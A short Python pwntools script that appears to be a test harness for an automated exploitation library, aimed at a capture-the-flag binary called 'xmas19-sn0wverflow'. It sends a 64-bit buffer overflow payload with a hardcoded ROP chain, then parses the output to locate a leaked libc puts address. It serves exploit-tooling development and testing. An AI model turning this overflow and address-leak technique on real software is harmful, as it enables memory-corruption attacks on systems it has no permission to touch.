from pwn import *

import sf
import time

import sys

target = process("./chall-test_LocalLibcId-xmas19-sn0wverflow")
gdb.attach(target, execute="get_libc_puts_address")

bof_payload = sf.BufferOverflow(arch=64)

bof_payload.set_input_start(0x12)
rop_chain = [4199027, 4210712, 4198448]
bof_payload.add_rop_chain(rop_chain)
payload = bof_payload.generate_payload()
target.sendline(payload)
foundEnd = False
output = b""
while foundEnd == False:
	try:
		output += target.recvline()
	except:
		foundEnd = True
if len(output) == 0:
		
		output_file = open("justifies", "w")
		output_file.write("")
		output_file.close()
		sys.exit(0)

putsFile = open("far-cry", "r")
putsAddress = putsFile.read()
putsFile.close()
putsAddress = int(putsAddress, 16)
outputLines = output.split(b"\n")
if len(outputLines) == 1:
	leakLine = outputLines[0]
else:
	leakLine = outputLines[-2]
workingLeakLine = leakLine.strip(b"\n")
lineLength = 8
if len(workingLeakLine) < 8:
	lineLength = len(workingLeakLine)
hexValues = []

for i in range(1, lineLength + 1):
		currentLeak = workingLeakLine[-i:]

		currentAddress = u64(currentLeak + b"\x00"*(8-len(currentLeak)))
		print(hex(currentAddress))
		if currentAddress == putsAddress:
			savedIndex = i
			break
finalFiller_output = leakLine[:-savedIndex]
filler_output = outputLines[:-2]
filler_output.append(finalFiller_output)
filler_output = b"\\n".join(filler_output)
output_file = open("justifies", "wb")
output_file.write(filler_output)
output_file.close()

